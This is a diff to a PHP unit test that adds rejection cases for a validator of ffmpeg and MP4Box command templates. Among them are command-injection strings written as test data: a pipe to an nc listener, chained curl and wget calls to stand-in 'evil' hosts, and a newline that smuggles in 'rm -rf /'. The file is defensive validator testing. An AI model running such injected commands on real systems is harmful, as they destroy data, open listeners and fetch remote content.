@@ -105,6 +105,35 @@ final class command_validator_test extends \basic_testcase {
             'duplicate placeholder' => [
                 '/usr/local/bin/ffmpeg -i {INPUT} {OUTPUT} {OUTPUT}',
             ],
+            // Boundary: empty string.
+            'empty command' => [''],
+            // Boundary: whitespace control characters are forbidden.
+            'tab character embedded' => [
+                "/usr/local/bin/ffmpeg\t-i {INPUT} {OUTPUT}",
+            ],
+            'carriage return embedded' => [
+                "/usr/local/bin/ffmpeg\r-i {INPUT} {OUTPUT}",
+            ],
+            // Boundary: dollar-brace variable expansion.
+            'dollar-brace variable expansion' => [
+                '/usr/local/bin/ffmpeg ${EVIL} -i {INPUT} {OUTPUT}',
+            ],
+            // Boundary: non-ASCII unicode (emoji) rejected by allow-list.
+            'unicode emoji argument' => [
+                '/usr/local/bin/ffmpeg \xF0\x9F\x98\x88 -i {INPUT} {OUTPUT}',
+            ],
+            // Boundary: NUL byte injection.
+            'NUL byte injection' => [
+                "/usr/local/bin/ffmpeg\x00 -i {INPUT} {OUTPUT}",
+            ],
+            // Boundary: a question mark / wildcard (* ?) -- not in the
+            // allow-list, must be rejected.
+            'wildcard star' => ['/usr/local/bin/ffmpeg -i {INPUT}* {OUTPUT}'],
+            'wildcard question' => ['/usr/local/bin/ffmpeg -i {INPUT}? {OUTPUT}'],
+            // Boundary: brackets are not in allow-list.
+            'square bracket subshell' => [
+                '/usr/local/bin/ffmpeg [evil] -i {INPUT} {OUTPUT}',
+            ],
         ];
     }
 
@@ -132,6 +161,11 @@ final class command_validator_test extends \basic_testcase {
             'with redirect' => ['/usr/local/bin/MP4Box > /tmp/exploit'],
             'wrong binary' => ['/bin/cat'],
             'subshell' => ['$(ls)'],
+            // Boundary additions.
+            'pipe append' => ['/usr/local/bin/MP4Box | nc -lvp 1234'],
+            'logical OR' => ['/usr/local/bin/MP4Box && curl evil.example'],
+            'wrong binary with options' => ['/usr/bin/wget -O - http://evil/'],
+            'embedded newline' => ["/usr/local/bin/MP4Box\nrm -rf /"],
         ];
     }
 
